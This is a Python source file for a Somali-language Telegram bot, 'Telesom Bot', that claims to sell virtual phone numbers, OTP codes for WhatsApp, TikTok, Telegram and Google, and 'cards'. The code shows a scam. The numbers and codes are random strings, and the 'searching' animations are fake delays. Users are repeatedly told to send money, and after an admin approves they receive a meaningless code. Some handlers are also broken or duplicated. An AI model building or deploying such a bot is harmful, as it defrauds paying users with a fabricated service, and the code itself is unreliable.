import os, random, asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7983838654"))

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
user_data = {}
pending_admin = {}

# ===== STATES =====
class UserState(StatesGroup):
    waiting_name = State()
    waiting_age = State()
    waiting_photo = State()
    waiting_code_check = State()

# ===== HELPERS =====
def random_number():
    return "063" + "".join(str(random.randint(0,9)) for _ in range(7))

def service_code(service):
    codes = {
        "whatsapp": lambda: "".join(random.choices("0123456789", k=6)),
        "tiktok": lambda: "TT" + "".join(random.choices("0123456789", k=5)),
        "telegram": lambda: "TG" + "".join(random.choices("0123456789", k=5)),
        "google": lambda: "G-" + "".join(random.choices("0123456789", k=8)),
    }
    return codes.get(service, lambda: "".join(random.choices("0123456789", k=6)))()

async def animation(msg, text, sec=5):
    for i in range(sec):
        dots = "." * ((i%3)+1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(lambda message: message.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca order-ka:", reply_markup=kb)

# ===== CHECK CODE =====
@dp.message(lambda message: message.text == "Check Code")
async def check_code(msg: Message):
    await msg.answer("Fadlan gali code-kaaga si loo hubiyo.")

# ===== VIRTUAL =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton("TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton("TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton("GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro Adeeg:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def service_selected(call: types.CallbackQuery):
    service = call.data
    number = random_number()
    user_data[call.from_user.id] = {"service":service, "number":number}
    msg = await call.message.edit_text(f"Number Searching...")
    await animation(msg,"Number Searching",5)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="confirm_number")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await msg.edit_text(
        f"Number: +252{user_data[call.from_user.id]['number']}\nSend payment to this number.",
        reply_markup=kb
    )

# ===== CANCEL =====
@dp.callback_query(F.data=="cancel")
async def cancel(call: types.CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ===== CONFIRM NUMBER =====
@dp.callback_query(F.data=="confirm_number")
async def confirm_number(call: types.CallbackQuery):
    msg = await call.message.edit_text("OTP Searching")
    await animation(msg,"OTP Searching",5)
    service = user_data[call.from_user.id]["service"]
    code = service_code(service)
    user_data[call.from_user.id]["code"] = code
    pending_admin[call.from_user.id] = True
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"admin_ok_{call.from_user.id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"New OTP Request\nUser:{call.from_user.id}\nService:{service}\nNumber:{user_data[call.from_user.id]['number']}\nCode:{code}",
        reply_markup=kb
    )
    await asyncio.sleep(10)
    if pending_admin.get(call.from_user.id):
        await call.message.answer("PLEASE SEND MONEY 💵")

# ===== ADMIN APPROVE =====
@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_approve(call: types.CallbackQuery):
    uid=int(call.data.split("_")[-1])
    if uid in user_data:
        pending_admin[uid]=False
        await bot.send_message(uid,f"Payment Confirmed ✅\nOTP Code: {user_data[uid]['code']}")
        await call.message.edit_text("Approved ✅")

# ===== CARD =====
@dp.callback_query(F.data=="card")
async def card_menu(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP", callback_data="vip")],
        [InlineKeyboardButton("NORMAL", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:",reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_selected(call: types.CallbackQuery):
    card_type=call.data
    user_data[call.from_user.id]["card"]=card_type
    code = service_code("card")
    user_data[call.from_user.id]["code"] = code
    pending_admin[call.from_user.id] = True
    await call.message.edit_text(f"{card_type} selected. Waiting for admin approval.")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"admin_ok_{call.from_user.id}")]
    ])
    await bot.send_message(ADMIN_ID,f"User {call.from_user.id} ordered {card_type} Card. Code: {code}", reply_markup=kb)

# ===== CHECK CODE =====
@dp.message(F.text=="Check Code")
async def check_code(msg: types.Message):
    await msg.answer("Geli OTP Code:")
    await dp.current_state(user=msg.from_user.id).set_state(UserState.waiting_code_check)

@dp.message(UserState.waiting_code_check)
async def check_code_input(msg: types.Message, state: FSMContext):
    code = msg.text.strip()
    if user_data.get(msg.from_user.id,{}).get("code")==code:
        await msg.answer(f"Code Confirmed ✅\nNumber: +252{user_data[msg.from_user.id]['number']}")
    else:
        await msg.answer("Code invalid ❌")
    await state.clear()

# ===== RUN =====
async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
